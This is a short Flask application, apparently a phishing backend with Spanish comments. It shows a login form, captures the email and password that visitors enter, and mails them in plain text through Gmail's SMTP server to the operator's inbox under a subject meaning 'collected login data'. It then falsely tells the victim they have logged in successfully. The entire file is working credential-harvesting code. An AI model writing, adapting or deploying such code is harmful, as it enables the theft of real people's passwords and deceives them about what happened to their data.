from flask import Flask, render_template, request, flash, redirect, url_for
import smtplib
from email.mime.text import MIMEText
import os
from dotenv import load_dotenv

# Cargar las variables de entorno desde el archivo .env
load_dotenv()

# Datos del remitente (cargados desde el archivo .env)
SENDER_EMAIL = os.getenv("SENDER_EMAIL")
SENDER_PASSWORD = os.getenv("SENDER_PASSWORD")

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Necesario para usar flash()

# Ruta para mostrar la página de login
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para manejar el login
@app.route('/', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    if not email or not password:
        flash("Por favor, complete todos los campos.", "error")
        return redirect(url_for('index'))

    # Intentar enviar los datos por correo
    if send_data(email, password):
        flash("Hola, {}. Has iniciado sesión correctamente.".format(email), "success")
        return redirect(url_for('index'))
    else:
        flash("No se pudo enviar el correo. Inténtalo nuevamente.", "error")
        return redirect(url_for('index'))

# Función para enviar los datos por correo
def send_data(email, password):
    if not SENDER_EMAIL or not SENDER_PASSWORD:
        return False

    subject = "Datos de Login Recopilados"
    message_body = f"Correo: {email}\nContraseña: {password}"

    try:
        # Crear el mensaje de correo
        msg = MIMEText(message_body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = SENDER_EMAIL

        # Enviar el correo
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)

        return True
    except Exception as e:
        print(f"Error al enviar el correo: {e}")
        return False

if __name__ == '__main__':
    app.run(debug=True)

